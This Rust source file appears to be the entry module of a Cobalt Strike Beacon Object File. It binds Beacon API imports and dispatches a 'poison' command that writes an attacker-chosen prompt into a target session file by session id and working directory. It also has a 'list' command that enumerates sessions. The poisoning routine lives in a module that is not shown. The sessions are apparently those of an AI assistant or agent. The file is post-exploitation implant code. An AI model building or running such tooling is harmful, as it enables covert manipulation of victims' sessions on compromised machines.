//! Beacon API bindings for COFFLoader compatibility
//!
//! Uses __imp_BeaconXxx symbols that COFFLoader provides internally.

#![allow(dead_code)]

extern crate alloc;

// Beacon output type constants
pub const CALLBACK_OUTPUT: i32 = 0x0;
pub const CALLBACK_OUTPUT_UTF8: i32 = 0x20;
pub const CALLBACK_ERROR: i32 = 0x0d;

/// Data parser structure matching Beacon's datap
#[repr(C)]
pub struct DataParser {
    pub original: *mut u8,
    pub buffer: *mut u8,
    pub length: i32,
    pub size: i32,
}

impl DataParser {
    pub const fn new() -> Self {
        Self {
            original: core::ptr::null_mut(),
            buffer: core::ptr::null_mut(),
            length: 0,
            size: 0,
        }
    }
}

// Function pointer types for Beacon API
type BeaconOutputFn = unsafe extern "C" fn(i32, *const u8, i32);
type BeaconDataParseFn = unsafe extern "C" fn(*mut DataParser, *mut u8, i32);
type BeaconDataIntFn = unsafe extern "C" fn(*mut DataParser) -> i32;
type BeaconDataExtractFn = unsafe extern "C" fn(*mut DataParser, *mut i32) -> *mut u8;

// Beacon API symbols - these are provided by COFFLoader internally
unsafe extern "C" {
    #[link_name = "__imp_BeaconOutput"]
    static BEACON_OUTPUT: BeaconOutputFn;

    #[link_name = "__imp_BeaconDataParse"]
    static BEACON_DATA_PARSE: BeaconDataParseFn;

    #[link_name = "__imp_BeaconDataInt"]
    static BEACON_DATA_INT: BeaconDataIntFn;

    #[link_name = "__imp_BeaconDataExtract"]
    static BEACON_DATA_EXTRACT: BeaconDataExtractFn;
}

/// Output data to Beacon console
pub unsafe fn beacon_output(typ: i32, data: *const u8, len: i32) {
    unsafe { (BEACON_OUTPUT)(typ, data, len) };
}

/// Initialize data parser with buffer
pub unsafe fn beacon_data_parse(parser: *mut DataParser, buffer: *mut u8, size: i32) {
    unsafe { (BEACON_DATA_PARSE)(parser, buffer, size) };
}

/// Extract integer from data parser
pub unsafe fn beacon_data_int(parser: *mut DataParser) -> i32 {
    unsafe { (BEACON_DATA_INT)(parser) }
}

/// Extract byte buffer from data parser
pub unsafe fn beacon_data_extract(parser: *mut DataParser, size: *mut i32) -> *mut u8 {
    unsafe { (BEACON_DATA_EXTRACT)(parser, size) }
}

/// Output a string to Beacon console
pub fn output(s: &str) {
    unsafe {
        beacon_output(CALLBACK_OUTPUT_UTF8, s.as_ptr(), s.len() as i32);
    }
}

/// Output an error message
pub fn output_error(s: &str) {
    unsafe {
        let prefix = b"[!] ";
        beacon_output(CALLBACK_ERROR, prefix.as_ptr(), prefix.len() as i32);
        beacon_output(CALLBACK_ERROR, s.as_ptr(), s.len() as i32);
        beacon_output(CALLBACK_ERROR, b"\n".as_ptr(), 1);
    }
}

/// Extract a null-terminated string from parser
pub unsafe fn extract_string(parser: *mut DataParser) -> &'static str {
    unsafe {
        let mut len: i32 = 0;
        let ptr = beacon_data_extract(parser, &mut len);
        if ptr.is_null() || len <= 0 {
            return "";
        }
        let slice = core::slice::from_raw_parts(ptr, len as usize);
        let end = slice.iter().position(|&b| b == 0).unwrap_or(len as usize);
        if end > 0 {
            core::str::from_utf8_unchecked(&slice[..end])
        } else {
            ""
        }
    }
}

/// BOF entry point
///
/// Supports two argument formats:
/// 1. Cobalt Strike bof_pack("izzzz", cmd, session_file, session_id, cwd, prompt)
/// 2. No args / empty args -> defaults to list
///
/// Commands (via bof_pack):
///   cmd=0: poison (requires session_file, session_id, cwd, prompt)
///   cmd=1: list
#[unsafe(no_mangle)]
pub unsafe extern "C" fn go(args: *mut u8, args_len: i32) {
    unsafe {
        // Check if we have valid bof_pack arguments (at least 4 bytes for command int)
        if !args.is_null() && args_len >= 4 {
            // Try to parse as bof_pack format
            let mut parser = DataParser::new();
            beacon_data_parse(&mut parser, args, args_len);

            let command = beacon_data_int(&mut parser);

            match command {
                0 => {
                    // Poison command - extract remaining args
                    let session_file = extract_string(&mut parser);
                    let session_id = extract_string(&mut parser);
                    let cwd = extract_string(&mut parser);
                    let prompt = extract_string(&mut parser);

                    if session_file.is_empty() || session_id.is_empty() || prompt.is_empty() {
                        // Not valid bof_pack data, default to list
                        super::poison::list_sessions();
                        return;
                    }

                    super::poison::execute_poison(session_file, session_id, cwd, prompt);
                    return;
                }
                1 => {
                    // List command
                    super::poison::list_sessions();
                    return;
                }
                _ => {
                    // Unknown command or not bof_pack format, default to list
                }
            }
        }

        // Default: list sessions
        super::poison::list_sessions();
    }
}

/// Alternative entry point
#[unsafe(no_mangle)]
pub unsafe extern "C" fn entry(args: *mut u8, args_len: i32) {
    unsafe { go(args, args_len) }
}
